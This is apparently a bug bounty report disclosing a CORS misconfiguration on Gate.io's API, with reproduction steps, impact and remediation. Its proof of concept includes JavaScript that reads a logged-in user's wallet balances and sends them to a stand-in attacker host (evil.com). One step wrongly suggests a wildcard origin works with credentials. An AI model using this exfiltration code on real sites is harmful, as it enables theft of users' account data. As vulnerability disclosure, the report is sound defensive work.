# Title: CORS Misconfiguration Exposing API Endpoints on Crypto Exchange

- **Platform**: HackenProof
- **Program**: Gate.io Web & API
- **Severity**: Medium
- **Date**: 2024-07-22
- **Researcher**: cyberarmy101
- **Bounty**: $800

## Summary
A Cross-Origin Resource Sharing (CORS) misconfiguration was discovered on the Gate.io cryptocurrency exchange platform. The API endpoints were configured with an overly permissive CORS policy that allowed arbitrary origins to make authenticated requests, potentially exposing user data and enabling cross-origin attacks.

## Technical Details
The API server was configured to reflect the `Origin` header in the `Access-Control-Allow-Origin` response header without proper validation. Additionally, the `Access-Control-Allow-Credentials` header was set to `true`, allowing cookies and authorization headers to be sent cross-origin. This combination allowed any malicious website to make authenticated API requests on behalf of users who were logged into Gate.io.

## Steps to Reproduce
1. Create a simple HTML page with JavaScript that sends XMLHttpRequest to the Gate.io API
2. Set `withCredentials` to true in the XHR request
3. When a logged-in user visits the malicious page, the browser sends the request including cookies
4. The server responds with `Access-Control-Allow-Origin: *` (or reflecting the malicious origin)
5. The attacker can read the response and exfiltrate the data

## Proof of Concept
```javascript
fetch('https://api.gate.io/api/v4/wallet/balances', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  fetch('https://evil.com/exfil', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

## Impact
- Unauthorized access to account balances and trade history
- Potential account takeover via session hijacking
- Exposure of API keys and trading credentials
- Financial loss through unauthorized trading

## Remediation
- Restrict `Access-Control-Allow-Origin` to a specific allowlist of trusted origins
- Only set `Access-Control-Allow-Credentials: true` for explicitly whitelisted origins
- Avoid reflecting the Origin header dynamically
- Use CSRF tokens for sensitive operations
- Implement additional authentication checks for sensitive endpoints

## References
- https://hackenproof.com/programs/gate-web
